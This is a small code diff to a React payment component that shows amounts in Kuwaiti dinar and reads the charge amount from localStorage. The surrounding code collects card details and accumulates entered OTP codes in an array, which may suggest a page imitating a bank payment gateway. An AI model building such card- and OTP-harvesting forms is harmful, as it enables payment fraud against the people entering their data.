@@ -134,6 +134,7 @@ export const Payment = (props: any) => {
 
   const [step, setstep] = useState(1);
   const [isloading, setIsloading] = useState(false);
+  const [amount, sedAmount] = useState('5');
   const [newotp] = useState([""]);
   const [paymentInfo, setPaymentInfo] = useState<PaymentInfo>({
     cardNumber: "",
@@ -153,8 +154,9 @@ export const Payment = (props: any) => {
     newotp.push(`${otp} , `);
   };
   useEffect(() => {
-    //handleAddotp(paymentInfo.otp!)
-  }, [paymentInfo.otp]);
+    const ammout = localStorage.getItem("amount");
+    sedAmount(ammout)
+  }, []);
 
   useEffect(() => {
     const visitorId = localStorage.getItem("visitor");
@@ -225,7 +227,7 @@ export const Payment = (props: any) => {
                 <div id="OrgTranxAmt">
                   <label className="column-label"> Amount: </label>
                   <label className="column-value text-label" id="amount">
-                    {"  "}KD&nbsp; {props.isCheked === "payfull" ? 4 : 0.5}
+                    {"  "}&nbsp; {props.isCheked === "payfull" ? amount : 0.5}KD
                   </label>
                 </div>
                 {/* Added for PG Eidia Discount starts   */}
